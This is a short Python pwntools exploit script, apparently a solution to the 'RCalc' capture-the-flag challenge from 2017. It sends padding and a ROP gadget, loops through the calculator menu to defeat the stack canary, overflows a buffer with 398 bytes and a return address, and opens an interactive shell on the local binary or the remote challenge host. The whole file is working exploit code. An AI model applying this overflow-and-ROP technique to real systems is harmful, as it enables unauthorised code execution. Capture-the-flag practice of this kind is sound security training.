#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

context.log_level = "debug"
context.terminal = ['terminator', '-x', 'bash', '-c']
debug = 1
if debug:
    p = process('./RCalc')
    gdb.attach(p)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    p = remote("rcalc.2017.teamrois.cn", 2333)
    libc = ELF("./libc.so.6")

e = ELF("RCalc")

p.recvuntil("pls:")
payload = p64(0xffffffffb83fec36) * 35         # padding
## ROP
payload += p64(0x00000000004007ef)             # add eax, 0x48002018 ; test eax, eax ; je 0x400803 ; call rax
p.sendline(payload)

# canary attack
for x in xrange(35):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("integer:")
    p.sendline("0")
    p.sendline("1203770314")
    p.recvuntil("result?")
    p.sendline("yes")
p.recvuntil("choice:")
p.sendline("4294967301")
p.sendline("a"*398+p64(0x400bee))
p.interactive()
